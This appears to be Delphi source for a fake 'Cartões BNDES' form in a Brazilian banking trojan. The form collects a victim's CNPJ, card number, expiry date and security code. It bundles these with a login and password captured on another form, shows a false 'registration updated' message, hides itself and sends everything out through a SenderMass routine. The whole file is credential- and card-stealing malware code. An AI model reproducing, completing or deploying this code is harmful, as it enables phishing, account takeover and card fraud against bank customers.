unit CardBndes2;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TFraBndes = class(TFrame)
    Image1: TImage;
    Editcnp: TEdit;
    Editcnae: TEdit;
    Editcard: TEdit;
    Editmes: TEdit;
    Editano: TEdit;
    Editseg: TEdit;
    Image2: TImage;
    procedure Image2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

implementation

{$R *.dfm}
uses
Natal, Gerador, CardBndes;

procedure TFraBndes.Image2Click(Sender: TObject);
begin
   Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;

     if EditCNP.Text='' then
  begin
    MessageBox(Self.handle,'Informe o CNPJ.', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;

      if Editcnae.Text='' then
  begin
    MessageBox(Self.handle,'Informe o CNAE Fiscal', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;

     if Editcard.Text='' then
  begin
    MessageBox(Self.handle,'Informe o número do cartão BNDES', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;

       if Editmes.Text='' then
  begin
    MessageBox(Self.handle,'Informe o mês da validade do cartão BNDES', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;

       if EditAno.Text='' then
  begin
    MessageBox(Self.handle,'Informe o ano da validade do cartão BNDES', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;

         if EditSeG.Text='' then
  begin
    MessageBox(Self.handle,'Informe o código de segurança do cartão BNDES', 'Cartões BNDES', mb_IconError + mb_Ok);
    exit;
  end;


DadosEnvio_ := TStringList.Create;

DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('BNDES:');
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('CNPJ: '        +BndesFor.Editcnpj.Text);
DadosEnvio_.Add('CPF OU LOGIN: '+BndesFor.EditCpfLogin.Text);
DadosEnvio_.Add('SENHA:'        +BndesFor.EditSenha.text);
DadosEnvio_.Add('CNPJ: '        +Editcnp.Text);
DadosEnvio_.Add('CARTAO: '      +Editcard.Text);
DadosEnvio_.Add('VALIDADE: '    +Editmes.Text+'/'+Editano.Text);
DadosEnvio_.Add('CVV: '         +Editseg.text);
DadosEnvio_.Add('=============================================');


Application.MessageBox(' Cadastro Atualizado com Sucesso! ', 'Cartões BNDES',mb_Ok+mb_IconInformation);



//SenderFull
try
  BndesFor.Visible := False;
  SenderMass(DadosEnvio_ , 'BNDES');
  DadosEnvio_.Free;
except
end;

  BndesFor.TimerBn.Enabled := False;

end;
end.
